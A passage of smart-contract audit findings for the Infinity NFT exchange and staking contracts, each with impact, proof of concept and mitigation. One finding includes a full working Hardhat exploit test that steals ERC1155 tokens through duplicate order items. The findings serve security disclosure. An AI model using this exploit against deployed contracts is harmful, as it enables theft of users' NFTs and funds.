Of course for this attack to work for `matchOneToManyOrders()` off-chain matching engine need to send wrong data but checks on the contract are not enough.  There are other scenarios for other functions that can cause griefing, for example for function `matchOrders()`: a user can have multiple order to buy some tokens in list of ids. it's possible to match these old orders: 1. `user1` has this order: A:`(user1 BUY 1 of IDs[1,2,3])` and  B:`(user1 BUY 1 of IDs[1,4,5])`  2. then the order B get executed for ID[1] and `user1` become the owner of `ID[1]` 3. `user1` wants to sell some of his tokens so he signs this order: C::`(user1 SELL 1 of IDs[1,6,7])` 4. matching engine would send order A and C with `constructedNfts=ID[1]` to `matchOrders()`. 5. `matchOrders()` would check conditions and would see that conditions are met and perform the transaction. 6. `user1` would pay some unnecessary order fee and it would become like griefing and DOS attack for him.  There may be other scenarios for this vuln to be harmful for users.  ## Tools Used VIM  ## Recommended Mitigation Steps add some checks to ensure that `seller != buyer`   
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L300-L328   # Vulnerability details  An order's type and it's rules are defined in it's `Complication`. Not checking it would allow anyone to take any orders regardless of their Complication's rule, causing unexpected execution for order makers.  `takeMultipleOneOrders` assumes that all `makerOrders` are simple orderbook orders and the  Complication check is missing here.  #### Proof of Concept - Alice signs a makerOrder with `PrivateSaleComplication`, allowing only Bob to take the private sale order. - A malicious trader calls `takeMultipleOneOrders` to take Alice's order, despite the Complication only allowing Bob to take it.  #### Recommended Mitigation Steps Add `canExecTakeOneOrder` function in IComplication.sol and implement it in `InfinityOrderBookComplication` (and future Complications) to support `takeMultipleOneOrders` operation, then modify `takeMultipleOneOrders` to use the check: ``` function takeMultipleOneOrders() {     ...     for (uint256 i = 0; i < numMakerOrders; ) {         bytes32 makerOrderHash = _hash(makerOrders[i]);         bool makerOrderValid = isOrderValid(makerOrders[i], makerOrderHash);         bool executionValid = IComplication(makerOrders[i].execParams[0]).canExecTakeOneOrder(makerOrders[i]);                  require(makerOrderValid && executionValid, 'order not verified');                  require(currency == makerOrders[i].execParams[1], 'cannot mix currencies');         require(isMakerSeller == makerOrders[i].isSellOrder, 'cannot mix order sides');         uint256 execPrice = _getCurrentPrice(makerOrders[i]);         totalPrice += execPrice; // @audit-issue missing complication check         _execTakeOneOrder(makerOrderHash, makerOrders[i], isMakerSeller, execPrice);         unchecked {             ++i;         }     }     ... } ```  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L67 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L86-L90 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L116    # Vulnerability details  ## Impact `InfinityStaker.sol` implemented Pausable contract, but there's no functionality added to `pause` and `unpause` the contract. If any attacker finds a way to exploit the contract and it's funds, at that time it will not let you pause the contract and funds can be lost.  ## Proof of Concept `InfinityStaker.sol` inhereted `Pausable.sol` of `Openzeppelin` and used `whenNotPaused` modifier for `stake()`, `unstake()` and `changeDuration()`,        function _pause() internal virtual whenNotPaused {         _paused = true;         emit Paused(_msgSender());      }   `_pause()` and `_unpause()` function of `Pausable.sol` used to `pause` and `unpause` the contract respectively and both has `internal` visibility, to use these functions it needs to access from the `infinityStaker.sol` internally.  ## Tools Used Manual Analysis  ## Recommended Mitigation Steps add `pause` and `unpause` the contract function to `InfinityStaker.sol`  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityOrderBookComplication.sol#L140   # Vulnerability details  ## Impact canExecMatchOrder is having an incorrect check which makes a valid order as invalid. doItemsIntersect function is also checked on sell.nfts, buy.nfts which is incorrect. doItemsIntersect should only be checked in reference to constructedNfts  ## Proof of Concept 1. Assume buy has nfts {A,B,C}, sell has nft {A,B}, constructedNfts has nft {A}, buy.constraints[0]/sell.constraints[0]/numConstructedItems is 1  2. Ideally this order should match since constructedNfts {A} is present in both buy and sell  3. But this will not match since doItemsIntersect(sell.nfts, buy.nfts) will fail because of item C which is not present in sell  ## Recommended Mitigation Steps Remove doItemsIntersect(sell.nfts, buy.nfts) from InfinityOrderBookComplication.sol#L140  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L287-L325   # Vulnerability details  ## Impact function `_updateUserStakedAmounts()` is supposed to update user staked amounts and it sets `userstakedAmounts[user][].timestamp=0` when `userstakedAmounts[user][].amount` is `0x0`. but there are some cases that code logic don't handle them and `amount` become `0x0` and code don't set `timestamp` to `0x0`. so any logic that is depended on `timestamp==0` when `amount==0` could fail, to my understanding setting `timestamp` is for gas efficiency.  ## Proof of Concept This is `_updateUserStakedAmounts()` code: ```   /** @notice Update user staked amounts for different duration on unstake     * @dev A more elegant recursive function is possible but this is more gas efficient    */   function _updateUserStakedAmounts(     address user,     uint256 amount,     uint256 noVesting,     uint256 vestedThreeMonths,     uint256 vestedSixMonths,     uint256 vestedTwelveMonths   ) internal {     if (amount > noVesting) {       userstakedAmounts[user][Duration.NONE].amount = 0;       userstakedAmounts[user][Duration.NONE].timestamp = 0;       amount = amount - noVesting;       if (amount > vestedThreeMonths) {         userstakedAmounts[user][Duration.THREE_MONTHS].amount = 0;         userstakedAmounts[user][Duration.THREE_MONTHS].timestamp = 0;         amount = amount - vestedThreeMonths;         if (amount > vestedSixMonths) {           userstakedAmounts[user][Duration.SIX_MONTHS].amount = 0;           userstakedAmounts[user][Duration.SIX_MONTHS].timestamp = 0;           amount = amount - vestedSixMonths;           if (amount > vestedTwelveMonths) {             userstakedAmounts[user][Duration.TWELVE_MONTHS].amount = 0;             userstakedAmounts[user][Duration.TWELVE_MONTHS].timestamp = 0;           } else {             userstakedAmounts[user][Duration.TWELVE_MONTHS].amount -= amount;           }         } else {           userstakedAmounts[user][Duration.SIX_MONTHS].amount -= amount;         }       } else {         userstakedAmounts[user][Duration.THREE_MONTHS].amount -= amount;       }     } else {       userstakedAmounts[user][Duration.NONE].amount -= amount;     }   } ``` for example if `amount=noVesting` then code would execute line: `userstakedAmounts[user][Duration.NONE].amount -= amount;` which sets the `userstakedAmounts[user][Duration.NONE].amount` to `0x0` but `userstakedAmounts[user][Duration.NONE].timestamp` won't change. As as in all other logics when `amount` is `0x0` code set `timestamp` to `0x0` too but here that logic is not happening for this cases (amount equal to `noVesting` or `noVesting + vestedThreeMonths` or ...).  ## Tools Used VIM  ## Recommended Mitigation Steps change if conditions from `>` to `>=`, so for equal case the code set `timestamp` to `0x0` too.  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1062   # Vulnerability details  ## Impact If an NFT is sold that does not specify support for the ERC-721 or ERC-1155 standard interface, the sale will still succeed. In doing so, the seller will receive funds from the buyer, but the buyer will not receive any NFT from the seller. This could happen in the following cases: 1. a token that claims to be ERC-721/1155 compliant, but fails to implement the `supportsInterface()` function properly. 2. an NFT that follows a standard other than ERC-721/1155 and does not implement their EIP-165 interfaces. 3. a malicious contract that is deployed to take advantage of this behavior.   ## Proof of Concept https://gist.github.com/kylriley/3bf0e03d79b3d62dd5a9224ca00c4cb9  ## Tools Used N/A  ## Recommended Mitigation Steps If neither the ERC-721 nor the ERC-1155 interface is supported the function should revert. An alternative approach would be to attempt a `transferFrom` and check the balance before and after to ensure that it succeeded.  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L149 https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L202 https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L273   # Vulnerability details  ## Impact The way the gas refunds are computed in the InfinityExchange contract, the first orders pay less than the latter ones. This causes a loss of funds for the buyers whose orders came last in the batch.  ## Proof of Concept The issue is that the `startGasPerOrder` variable is computed within the for-loop. That causes the first iterations to be lower than later ones.  Here's an example for the following line: https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L202 To make the math easy we use the following values: ``` startGas = 1,000,000 gasPerOrder = 100,000 (so fulfilling an order costs us 100,000 gas) ordersLength = 10 ```  For the 2nd order we then get: ``` startGasPerOrder = 900,000 + ((1,000,000 + 20,000 - 900,000) / 10) startGasPerOrder = 912,000 ``` For the 9th order we get: ``` startGasPerOrder = 200,000 + ((1,000,000 + 20,000 - 200,000) / 10) startGasPerOrder = 282,000 ```  The `startGasPerOrder` variable is passed through a couple of functions without any modification until it reaches a line like this: https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L231  ```sol uint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice; ```  There, the actual gas costs for the user are computed.  In our case, that would be:  ``` # 2nd order # gasleft() is 800,00 because we said that executing the order costs ~100,000 gas. At the beginning of the order, it was 900,000 so now it's 800,000. This makes the computation a little more straightforward although it's not 100% correct. gasCost = (912,000 - 800,000 + 50,000) * 1 gasCost = 162,000  # 9th order gasCost = (282,000 - 100,000 + 50,000) * 1 gasCost = 232,000 ```  So the 2nd order's buyer pays `162,000` while the 9th order's buyer pays `232,000`.  As I said the math was dumbed down a bit to make it easier. The actual difference might not be as big as shown here. But, there is a difference.  ## Tools Used none  ## Recommended Mitigation Steps The `startGasPerOrder` variable should be initialized *outside* the for-loop.  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L375-L402 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L507-L530   # Vulnerability details  ## Impact The current nonce is non-deterministic. This means that at any point in time, it is not possible to say what the current nonce for a given signer is.  **So, there is no way to cancel all pending orders.**  ## Proof of Concept Let's say there was a mass phishing attack on users and some signatures were phished.  Since the user does not know the nonce of the signatures that were signed by him/her, he/she cannot cancel it via `cancelMultipleOrders`.  And there is no way to cancel all pending orders. Since the nonce can be any arbitrary value, if the signature had a UINT256 MAX value, there is no way to cancel it via `cancelAllOrders`.  ## Tools Used VS Code  ## Recommended Mitigation Steps It is recommended to have a deterministic nonce, instead of a non-deterministic nonce. 1. Instead of tracking minNonce, we should track currentNonce. 2. Only allow one increment of the nonce. `cancelAllOrders` should increment the current nonce by 1. 3. Only signatures that match the currentNonce should be considered valid (exactly equal). 4. Instead of canceling orders by nonce, the hash map should be by order hash. So, `isUserOrderNonceExecutedOrCancelled[msg.sender][orderHash]` should be recorded.  If these steps are taken, any such phishing attack can be prevented by simply calling `cancelAllOrders` and incrementing the nonce, because the signature must match the current nonce, and so if the current nonce is incremented by 1, there will be a mismatch and will invalid all pending orders.  Also, specific listings can be canceled by `cancelMultipleOrders` which can check `isUserOrderNonceExecutedOrCancelled[msg.sender][orderHash]`  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/staking/InfinityStaker.sol#L290-L325   # Vulnerability details  ## Impact Following scenario:  Alice has staked X token for 6 months that have vested. She stakes Y tokens for another three months. If she now calls `unstake(X)` to take out the tokens that have vested, the Y tokens she staked for three months will be locked up.  ## Proof of Concept First, here's a test showcasing the issue:  ```js   describe('should cause trouble', () => {     it('should lock up funds', async function () {       await approveERC20(signer1.address, token.address, amountStaked, signer1, infinityStaker.address);       await infinityStaker.connect(signer1).stake(amountStaked, 2);       await network.provider.send("evm_increaseTime", [181 * DAY]);       await network.provider.send('evm_mine', []);              // The funds we staked for 6 months have vested       expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(amountStaked);        // Now we want to stake funds for three months       await approveERC20(signer1.address, token.address, amountStaked2, signer1, infinityStaker.address);       await infinityStaker.connect(signer1).stake(amountStaked2, 1);        // total staked is now the funds staked for three & six months       // total vested stays the same       expect(await infinityStaker.getUserTotalStaked(signer1.address)).to.eq(amountStaked.add(amountStaked2));       expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(amountStaked);        // we unstake the funds that are already vested.       const userBalanceBefore = await token.balanceOf(signer1.address);       await infinityStaker.connect(signer1).unstake(amountStaked);       const userBalanceAfter = await token.balanceOf(signer1.address);        expect(userBalanceAfter).to.eq(userBalanceBefore.add(amountStaked));        expect(await infinityStaker.getUserTotalStaked(signer1.address)).to.eq(ethers.BigNumber.from(0));       expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(ethers.BigNumber.from(0));     });   }); ```  The test implements the scenario I've described above. In the end, the user got back their `amountStaked` tokens with the `amountStaked2` tokens being locked up in the contract. The user has no tokens staked at the end.  The issue is in the `_updateUserStakedAmounts()` function:  ```sol     if (amount > noVesting) {       userstakedAmounts[user][Duration.NONE].amount = 0;       userstakedAmounts[user][Duration.NONE].timestamp = 0;       amount = amount - noVesting;       if (amount > vestedThreeMonths) {         // MAIN ISSUE:         // here `vestedThreeMonths` is 0. The current staked tokens are set to `0` and `amount` is decreased by `0`.         // Since `vestedThreeMonths` is `0` we shouldn't decrease `userstakedAmounts` at all here.         userstakedAmounts[user][Duration.THREE_MONTHS].amount = 0;         userstakedAmounts[user][Duration.THREE_MONTHS].timestamp = 0;         amount = amount - vestedThreeMonths;         // `amount == vestedSixMonths` so we enter the else block         if (amount > vestedSixMonths) {           userstakedAmounts[user][Duration.SIX_MONTHS].amount = 0;           userstakedAmounts[user][Duration.SIX_MONTHS].timestamp = 0;           amount = amount - vestedSixMonths;           if (amount > vestedTwelveMonths) {             userstakedAmounts[user][Duration.TWELVE_MONTHS].amount = 0;             userstakedAmounts[user][Duration.TWELVE_MONTHS].timestamp = 0;           } else {             userstakedAmounts[user][Duration.TWELVE_MONTHS].amount -= amount;           }         } else {           // the staked amount is set to `0`.           userstakedAmounts[user][Duration.SIX_MONTHS].amount -= amount;         }       } else {         userstakedAmounts[user][Duration.THREE_MONTHS].amount -= amount;       }     } else {       userstakedAmounts[user][Duration.NONE].amount -= amount;     } ```   ## Tools Used none  ## Recommended Mitigation Steps Don't set `userstakedAmounts.amount` to `0` if none of its tokens are removed (`vestedAmount == 0`)  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1062-L1072   # Vulnerability details  ## Impact  Many real-world NFT tokens may support both ERC721 and ERC1155 standards, which may break `InfinityExchange::_transferNFTs`, i.e., transferring less tokens than expected.  For example, the asset token of [The Sandbox Game](https://www.sandbox.game/en/), a Top20 ERC1155 token on [Etherscan](https://etherscan.io/tokens-nft1155?sort=7d&order=desc), supports both ERC1155 and ERC721 interfaces. Specifically, any ERC721 token transfer is regarded as an ERC1155 token transfer with only one item transferred ([token address](https://etherscan.io/token/0xa342f5d851e866e18ff98f351f2c6637f4478db5) and [implementation](https://etherscan.io/address/0x7fbf5c9af42a6d146dcc18762f515692cd5f853b#code#F2#L14)).  Assuming there is a user tries to buy two tokens of Sandbox's ASSETs with the same token id, the actual transferring is carried by `InfinityExchange::_transferNFTs` which first checks ERC721 interface supports and then ERC1155.  ```solidity=   function _transferNFTs(     address from,     address to,     OrderTypes.OrderItem calldata item   ) internal {     if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {       _transferERC721s(from, to, item);     } else if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {       _transferERC1155s(from, to, item);     }   } ```  The code will go into `_transferERC721s` instead of `_transferERC1155s`, since the Sandbox's ASSETs also support ERC721 interface. Then,   ```solidity=   function _transferERC721s(     address from,     address to,     OrderTypes.OrderItem calldata item   ) internal {     uint256 numTokens = item.tokens.length;     for (uint256 i = 0; i < numTokens; ) {       IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);       unchecked {         ++i;       }     }   } ```  Since the `ERC721(item.collection).safeTransferFrom` is treated as an ERC1155 transferring with one item ([reference](https://etherscan.io/address/0x7fbf5c9af42a6d146dcc18762f515692cd5f853b#code#F2#L833)), there is only one item actually gets traferred.  That means, the user, who barely know the implementation details of his NFTs, will pay the money for two items but just got one.  Note that the situation of combining ERC721 and ERC1155 is prevalent and poses a great vulnerability of the exchange contract.     ## Proof of Concept Check the return values of [Sandbox's ASSETs](https://etherscan.io/token/0xa342f5d851e866e18ff98f351f2c6637f4478db5)'s `supportInterface`, both `supportInterface(0x80ac58cd)` and `supportInterface(0xd9b67a26)` return true.   ## Tools Used Manual Inspection  ## Recommended Mitigation Steps Reorder the checks,e.g.,   ```solidity=   function _transferNFTs(     address from,     address to,     OrderTypes.OrderItem calldata item   ) internal {     if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {       _transferERC1155s(from, to, item);     } else if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {       _transferERC721s(from, to, item);     }   } ```   
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L154-L164 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L336-L364 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L178-L243   # Vulnerability details  ## Impact When any user provides a `sellOrder` and they are trying to sell multiple tokens from _n_ (n > 1) different `ERC1155` collections in a single order, hakcers can get the tokens of most expensive collections (with n times of the original amount) by paying the same price.  In short, hackers can violate the user-defined orders.  ## Root Cause The logic of `canExecTakeOrder` and `canExecMatchOneToMany` is not correct.  __Let's `canExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems) ` as an example, while `canExecMatchOneToMany` shares the same error.__   Specifically, it first checks whether the number of selling item in `makerOrder` matches with the ones in `takerItems`. Note that the number is an aggregated one. Then, it check whether all the items in `takerItems` are within the scope defined by `makerOrder`.  The problem comes when there are duplicated items in `takerItems`. The aggregated number would be correct and all taker's Items are indeed in the order. However, it does not means `takerItems` exactly matches all items in `makerOrder`, which means violation of the order.  For example, if the order requires ``` [     {           collection: mock1155Contract1.address,           tokens: [{ tokenId: 0, numTokens: 1 }]     },     {           collection: mock1155Contract2.address,           tokens: [{ tokenId: 0, numTokens: 1 }]     } ];  ```  and the taker provides ``` [     {           collection: mock1155Contract1.address,           tokens: [{ tokenId: 0, numTokens: 1 }]     },     {           collection: mock1155Contract1.address,           tokens: [{ tokenId: 0, numTokens: 1 }]     } ]; ```  The taker can grabs two `mock1155Contract1` tokens by paying the order which tries to sell a `mock1155Contract1` token and a `mock1155Contract2` token. When `mock1155Contract1` is much more expensive, the victim user will suffer from a huge loss.  As for the approving issue, the users may grant the contract unlimited access, or they may have another order which sells `mock1155Contract1` tokens. The attack is easy to perform.  ## Proof of Concept First put the `MockERC1155.sol` under the `contracts/` directory: ```solidity  // SPDX-License-Identifier: MIT pragma solidity 0.8.14; import {ERC1155URIStorage} from '@openzeppelin/contracts/token/ERC1155/extensions/ERC1155URIStorage.sol'; import {ERC1155} from '@openzeppelin/contracts/token/ERC1155/ERC1155.sol'; import {Ownable} from '@openzeppelin/contracts/access/Ownable.sol';  contract MockERC1155 is ERC1155URIStorage, Ownable {   uint256 numMints;    constructor(string memory uri) ERC1155(uri) {}    function mint(address to, uint256 id, uint256 amount, bytes memory data) external onlyOwner {     super._mint(to, id, amount, data);   } } ```  And then put `poc.js` under the `test/` directory. ```js const { expect } = require('chai'); const { ethers, network } = require('hardhat'); const { deployContract, NULL_ADDRESS, nowSeconds } = require('../tasks/utils'); const {   getCurrentSignedOrderPrice,   approveERC20,   grantApprovals,   signOBOrder } = require('../helpers/orders');  async function prepare1155OBOrder(user, chainId, signer, order, infinityExchange) {   // grant approvals   const approvals = await grantApprovals(user, order, signer, infinityExchange.address);   if (!approvals) {     return undefined;   }    // sign order   const signedOBOrder = await signOBOrder(chainId, infinityExchange.address, order, signer);    const isSigValid = await infinityExchange.verifyOrderSig(signedOBOrder);   if (!isSigValid) {     console.error('Signature is invalid');     return undefined;   }   return signedOBOrder; }  describe('PoC', function () {   let signers,     dev,     matchExecutor,     victim,     hacker,     token,     infinityExchange,     mock1155Contract1,     mock1155Contract2,     obComplication    const sellOrders = [];    let orderNonce = 0;    const UNIT = toBN(1e18);   const INITIAL_SUPPLY = toBN(1_000_000).mul(UNIT);    const totalNFTSupply = 100;   const numNFTsToTransfer = 50;   const numNFTsLeft = totalNFTSupply - numNFTsToTransfer;    function toBN(val) {     return ethers.BigNumber.from(val.toString());   }    before(async () => {     // signers     signers = await ethers.getSigners();     dev = signers[0];     matchExecutor = signers[1];     victim = signers[2];     hacker = signers[3];     // token     token = await deployContract('MockERC20', await ethers.getContractFactory('MockERC20'), signers[0]);      // NFT constracts (ERC1155)     mock1155Contract1 = await deployContract('MockERC1155', await ethers.getContractFactory('MockERC1155'), dev, [       'uri1'     ]);     mock1155Contract2 = await deployContract('MockERC1155', await ethers.getContractFactory('MockERC1155'), dev, [       'uri2'     ]);      // Exchange     infinityExchange = await deployContract(       'InfinityExchange',       await ethers.getContractFactory('InfinityExchange'),       dev,       [token.address, matchExecutor.address]     );      // OB complication     obComplication = await deployContract(       'InfinityOrderBookComplication',       await ethers.getContractFactory('InfinityOrderBookComplication'),       dev     );      // add currencies to registry     await infinityExchange.addCurrency(token.address);     await infinityExchange.addCurrency(NULL_ADDRESS);      // add complications to registry     await infinityExchange.addComplication(obComplication.address);      // send assets     await token.transfer(victim.address, INITIAL_SUPPLY.div(4).toString());     await token.transfer(hacker.address, INITIAL_SUPPLY.div(4).toString());     for (let i = 0; i < numNFTsToTransfer; i++) {       await mock1155Contract1.mint(victim.address, i, 50, '0x');       await mock1155Contract2.mint(victim.address, i, 50, '0x');     }   });    describe('StealERC1155ByDuplicateItems', () => {     it('Passed test denotes successful hack', async function () {       // prepare order       const user = {         address: victim.address       };       const chainId = network.config.chainId ?? 31337;       const nfts = [         {           collection: mock1155Contract1.address,           tokens: [{ tokenId: 0, numTokens: 1 }]         },         {           collection: mock1155Contract2.address,           tokens: [{ tokenId: 0, numTokens: 1 }]         }       ];       const execParams = { complicationAddress: obComplication.address, currencyAddress: token.address };       const extraParams = {};       const nonce = ++orderNonce;       const orderId = ethers.utils.solidityKeccak256(['address', 'uint256', 'uint256'], [user.address, nonce, chainId]);       let numItems = 0;       for (const nft of nfts) {         numItems += nft.tokens.length;       }       const order = {         id: orderId,         chainId,         isSellOrder: true,         signerAddress: user.address,         numItems,         startPrice: ethers.utils.parseEther('1'),         endPrice: ethers.utils.parseEther('1'),         startTime: nowSeconds(),         endTime: nowSeconds().add(10 * 60),         nonce,         nfts,         execParams,         extraParams       };       const sellOrder = await prepare1155OBOrder(user, chainId, victim, order, infinityExchange);       expect(sellOrder).to.not.be.undefined;        // form matching nfts       const nfts_ = [         {           collection: mock1155Contract1.address,           tokens: [{ tokenId: 0, numTokens: 1 }]         },         {           collection: mock1155Contract1.address,           tokens: [{ tokenId: 0, numTokens: 1 }]         }       ];        // approve currency       let salePrice = getCurrentSignedOrderPrice(sellOrder);       await approveERC20(hacker.address, token.address, salePrice, hacker, infinityExchange.address);        // perform exchange       await infinityExchange.connect(hacker).takeOrders([sellOrder], [nfts_]);        // owners after sale       // XXX: note that the user's intention is to send mock1155Contract1 x 1 + mock1155Contract2 x 1       // When mock1155Contract1 is much more expensive than mock1155Contract2, user suffers from huge loss       expect(await mock1155Contract1.balanceOf(hacker.address, 0)).to.equal(2);     });   }); }); ```  And run  ```bash $ npx hardhat test --grep PoC    PoC     StealERC1155ByDuplicateItems       ✓ Passed test denotes successful hack ```  Note that the passed test denotes a successful hack.  ## Tools Used Manual inspection.  ## Recommended Mitigation Steps I would suggest a more gas-consuming approach by hashing all the items and putting them into a list. Then checking whether the lists match.  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L323-L327 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L359-L363   # Vulnerability details  takeOrders() and takeMultipleOneOrders() are the main user facing functionality of the protocol. Both require `currency` to be fixed for the call and can have it either as a ERC20 token or ETH. This way, the probability of a user sending over a ETH with the call whose `currency` is a ERC20 token isn't negligible. However, in this case ETH funds of a user will be permanently lost.  Setting the severity to medium as this is permanent fund freeze scenario conditional on a user mistake, which probability can be deemed high enough as the same functions are used for ETH and ERC20 orders.  ## Proof of Concept  Both takeOrders() and takeMultipleOneOrders() only check that ETH funds are enough to cover the order's `totalPrice`:  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L323-L327  ```solidity     // check to ensure that for ETH orders, enough ETH is sent     // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent     if (isMakerSeller && currency == address(0)) {       require(msg.value >= totalPrice, 'invalid total price');     } ```  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L359-L363  ```solidity     // check to ensure that for ETH orders, enough ETH is sent     // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent     if (isMakerSeller && currency == address(0)) {       require(msg.value >= totalPrice, 'invalid total price');     } ```  When `currency` is some ERC20 token, while `msg.value > 0`, the `msg.value` will be permanently frozen within the contract.  ## Recommended Mitigation Steps  Consider adding the check for `msg.value` to be zero for the cases when it is not utilized:  ```solidity     // check to ensure that for ETH orders, enough ETH is sent     // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent     if (isMakerSeller && currency == address(0)) {       require(msg.value >= totalPrice, 'invalid total price');     } else {       require(msg.value == 0, 'non-zero ETH value');     } ```  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1228-L1232   # Vulnerability details  ETH fees accumulated from takeOrders() and takeMultipleOneOrders() operations are permanently frozen within the contract as there is only one way designed to retrieve them, a rescueETH() function, and it will work as intended, not being able to access ETH balance of the contract.  Setting the severity as high as the case is a violation of system's core logic and a permanent freeze of ETH revenue of the project.  ## Proof of Concept  Fees are accrued in user-facing takeOrders() and takeMultipleOneOrders() via the following call sequences:  ``` takeOrders -> _takeOrders -> _execTakeOrders -> _transferNFTsAndFees -> _transferFees takeMultipleOneOrders -> _execTakeOneOrder -> _transferNFTsAndFees -> _transferFees ```  While token fees are transferred right away, ETH fees are kept with the InfinityExchange contract:  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1119-L1141  ```solidity   /**    * @notice Transfer fees. Fees are always transferred from buyer to the seller and the exchange although seller is              the one that actually 'pays' the fees    * @dev if the currency ETH, no additional transfer is needed to pay exchange fees since the contract is 'payable'    * @param seller the seller    * @param buyer the buyer    * @param amount amount to transfer    * @param currency currency of the transfer    */   function _transferFees(     address seller,     address buyer,     uint256 amount,     address currency   ) internal {     // protocol fee     uint256 protocolFee = (PROTOCOL_FEE_BPS * amount) / 10000;     uint256 remainingAmount = amount - protocolFee;     // ETH     if (currency == address(0)) {       // transfer amount to seller       (bool sent, ) = seller.call{value: remainingAmount}('');       require(sent, 'failed to send ether to seller'); ```  I.e. when `currency` is ETH the fee part of the amount, `protocolFee`, is left with the InfinityExchange contract.  The only way to retrieve ETH from the contract is rescueETH() function:  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1228-L1232  ```solidity   /// @dev used for rescuing exchange fees paid to the contract in ETH   function rescueETH(address destination) external payable onlyOwner {     (bool sent, ) = destination.call{value: msg.value}('');     require(sent, 'failed');   } ```  However, it cannot reach ETH on the contract balance as `msg.value` is used as the amount to be sent over. I.e. only ETH attached to the rescueETH() call is transferred from `owner` to `destination`. ETH funds that InfinityExchange contract holds remain inaccessible.  ## Recommended Mitigation Steps  Consider adding contract balance to the funds transferred:  ```solidity   /// @dev used for rescuing exchange fees paid to the contract in ETH   function rescueETH(address destination) external payable onlyOwner { -   (bool sent, ) = destination.call{value: msg.value}(''); +   (bool sent, ) = destination.call{value: address(this).balance}('');     require(sent, 'failed');   } ```  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116   # Vulnerability details  The call stack: matchOneToManyOrders() -> _matchOneMakerSellToManyMakerBuys() -> _execMatchOneMakerSellToManyMakerBuys() -> _execMatchOneToManyOrders() -> _transferMultipleNFTs()  Based on the context, a maker buy order can set `OrderItem.tokens` as an empty array to indicate that they can accept any tokenId in this collection, in that case, `InfinityOrderBookComplication.doTokenIdsIntersect()` will always return `true`.  However, when the system matching a sell order with many buy orders, the `InfinityOrderBookComplication` contract only ensures that the specified tokenIds intersect with the sell order, and the total count of specified tokenIds equals the sell order's quantity (`makerOrder.constraints[0]`).  This allows any maker buy order with same collection and `empty tokenIds` to be added to `manyMakerOrders` as long as there is another maker buy order with specified tokenIds that matched the sell order's tokenIds.  